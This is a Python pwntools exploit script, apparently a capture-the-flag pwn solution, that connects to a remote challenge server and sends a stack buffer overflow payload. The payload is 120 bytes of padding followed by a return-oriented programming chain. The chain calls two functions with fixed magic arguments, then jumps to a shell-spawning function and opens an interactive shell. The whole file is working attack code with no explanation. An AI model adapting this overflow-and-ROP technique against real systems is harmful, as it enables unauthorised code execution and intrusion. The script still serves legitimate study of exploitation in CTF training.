#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/29 11:38:58
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = '1.14.160.21'
    port = 20001
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('pwn')
# gdb.attach(sh)
# pause()
pop_rdi = 0x0000000000401313
pop_rsi_r15 = 0x0000000000401311
fun1_addr = 0x401199 
fun2_addr = 0x4011F9
shell_addr = 0x401176
get_plt = elf.plt['gets']
string_addr = 0x404060
leave_ret = 0x00000000004011cd
bss_addr = 0x404070
payload = 'a' * 120 + p64(pop_rdi) + p64(0xB16BAD) + p64(fun1_addr) + p64(pop_rdi) + p64(0xBADF00D) + p64(pop_rsi_r15) + p64(0xFEE1DEAD) + p64(0) + p64(fun2_addr) + p64(shell_addr)
sh.sendline(payload)
sh.interactive()